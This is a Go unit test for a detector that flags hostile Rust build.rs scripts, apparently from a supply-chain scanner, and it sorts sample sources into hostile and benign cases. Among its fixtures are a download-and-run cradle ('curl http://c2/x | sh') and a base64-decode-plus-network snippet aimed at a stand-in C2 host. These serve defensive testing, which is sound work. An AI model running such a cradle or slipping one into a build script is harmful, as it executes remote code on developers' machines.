package main

import "testing"

// hostileBuildRS is the yank-lure Increment-3 gate: a build.rs is hostile only when
// it pairs network egress with code execution or decode-obfuscation, or is an
// outright download-and-run cradle. A benign build.rs — even one that reaches the
// network for a prebuilt binary, or only spawns a compiler — must not trip it.
func TestHostileBuildRS(t *testing.T) {
	cases := []struct {
		name string
		src  string
		want bool
	}{
		{"payload: network+decode", `fn main(){ let p = base64::decode(x); ureq::get(c2); }`, true},
		{"payload: cradle", `fn main(){ std::process::Command::new("sh").arg("-c").arg("curl http://c2/x | sh"); }`, true},
		{"benign: exec only (cc-style)", `fn main(){ std::process::Command::new("cc").arg("-c"); }`, false},
		{"benign: rerun marker", `fn main(){ println!("cargo:rerun-if-changed=build.rs"); }`, false},
		{"benign: network only (prebuilt fetch)", `fn main(){ reqwest::get("https://host/lib.a"); }`, false},
		// network + ambient exec, but no decode/creds/cradle: a build script that
		// fetches then compiles is indistinguishable from one that fetches then runs
		// a generic command, so this is deliberately NOT flagged (no FP on real builds).
		{"ambiguous: network+exec only", `fn main(){ reqwest::get("https://host/x"); std::process::Command::new("sh"); }`, false},
	}
	for _, tc := range cases {
		if got := hostileBuildRS(tc.src); got != tc.want {
			t.Errorf("%s: hostileBuildRS = %v, want %v", tc.name, got, tc.want)
		}
	}
}
